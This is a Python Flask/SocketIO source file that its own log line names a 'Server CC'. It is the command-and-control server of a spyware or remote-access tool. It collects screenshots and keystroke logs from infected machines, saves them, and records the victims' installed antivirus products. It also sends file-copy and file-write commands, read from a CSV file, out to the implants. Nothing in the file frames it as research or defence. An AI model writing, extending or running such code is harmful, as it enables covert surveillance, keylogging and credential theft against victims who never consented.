from flask import Flask, request
from flask_socketio import SocketIO, send, join_room, leave_room, rooms, disconnect
from time import sleep
from PIL import Image
import socketio
from datetime import datetime
import os
import csv
import logging

app = Flask(__name__)
app.config['SECRET_KEY'] = 'topsecret'
sio = SocketIO(app)

file_path = 'command.csv'
    
logger = logging.getLogger('server')
logging.basicConfig(filename='server.log', level=logging.INFO)

@sio.on('connect')
def handle_connect():
    logger.info(f"my SID is {request.sid}")
    #send_comm()
    '''while True:
        action_params = get_action(file_path)
        if action_params['command'] and int(action_params['command']) and action_params['send_tag']:
            with open('command.csv', 'r+') as csvfile:
                csvfile.seek(0)
                csvfile.truncate()
            logger.info('sending action')
            send_action(int(action_params['command']), action_params['filename'][0], action_params['param_1'][0])'''
    
   

@sio.on('sc_snap')
def get_snaps(img_data):
    logger.info("recevied screenshot")
    
    img = Image.frombytes(img_data['mode'], img_data['size'], img_data['image_data'])
    
            # Get the user's "Documents" folder
    documents_folder = os.path.expanduser("~/Documents")

    # Create the output folder if it doesn't exist
    output_folder = os.path.join(documents_folder, "screenshots")
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Get the current timestamp for the screenshot filename
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Capture the screenshot
    screenshot = img

    # Define the output file path
    output_file = os.path.join(output_folder, f"screenshot_{timestamp}.png")

    # Save the screenshot to the specified folder
    screenshot.save(output_file)

    logger.info(f"Screenshot saved to: {output_file}")
    logger.info("processed screenshot correctly")
    
@sio.on('key_recorder')
def get_keylogs(recorder):
    logger.info("keys received")
    with open('keylogs.txt', "a+") as kl:
        kl.write(recorder['data'])
    logger.info(f'processed keys succesfully')
    
@sio.on('response')
def command_output(response: dict):
    logger.info(f"response received: {response} ")
    logger.info(f"result: {response.get('result')}, id: {response.get('id')}")
    


@sio.on('antiviruses')
def get_installed_anitviruses(data):
    
    logger.info(f"installed antiv's: {data}")
    
    
@app.route('/static/downloads/<file>')
def give_info(file):
    logger.info(f"requested file {file}")
    with open(file, "r+") as f:
        data = f.read()
    logger.info(f"sending back '{data}'")
    return data

def send_action(comm_num, filename, file_data: str):
    logger.info(f'Start of get_command')
    
    if int(comm_num) == 1: 
        logger.info(f'Received command number {comm_num}')
        #comm_data = input("enter file name you wish to copy: ")
        
        sio.emit('action', {'action_number': int(comm_num), 'file': filename}) 
        logger.info(f"action with command number {comm_num} sent")
    elif int(comm_num) == 2: 
        logger.info(f'Received command number {comm_num}')
        #comm_data = input("enter file name you wish to copy: ")
        
        sio.emit('action', {'action_number': int(comm_num), 'file': filename, 'file_data': file_data.encode()}) 
        logger.info(f"action with command number {comm_num} sent")
    elif int(comm_num) == 3: 
        logger.info(f'Received command number {comm_num}')
        #comm_data = input("enter file name you wish to copy: ")
        
        sio.emit('action', {'action_number': int(comm_num), 'file': filename, 'file_data': file_data.encode}) 
        logger.info(f"action with command number {comm_num} sent")
    else:
        logger.warning('action chosen is invalid in some way')
        return
    
def send_comm():
    info = {'hi': 'what is my version', 'id': 1}
    sio.emit('command', info)
    logger.info(f'command {info} sent')

def get_action(file_path):
    command = ''
    parameters_1 = []
    parameters_2 = []
    parameters_3 = []
    parameters_4 = []
    parameters_5 = []
    send_info = False

    with open(file_path, newline='') as csvfile:
        csv_reader = csv.reader(csvfile)
        for row in csv_reader:
            # Assuming the first column is the command, the second column is parameters_1,
            # and the third column is parameters_2 (optional)
            if len(row) >= 2:
                command = row[0]
                parameters_1.append(row[1])
                parameters_2.append(row[2] if len(row) > 2 else None)
                parameters_3.append(row[3] if len(row) > 2 else None)
                parameters_4.append(row[4] if len(row) > 2 else None)
                parameters_5.append(row[5] if len(row) > 2 else None)
                if row[6] == 'send':
                    send_info = True
                

    return {'command': command, 'filename': parameters_1, 'param_1': parameters_2, 'param_2': parameters_3, 'param_3': parameters_4, 'param_4': parameters_5, 'send_tag': send_info}

if __name__ == '__main__':
    logger.info('Server CC starting main')
    sio.run(app, debug=True, log_output=True)
     
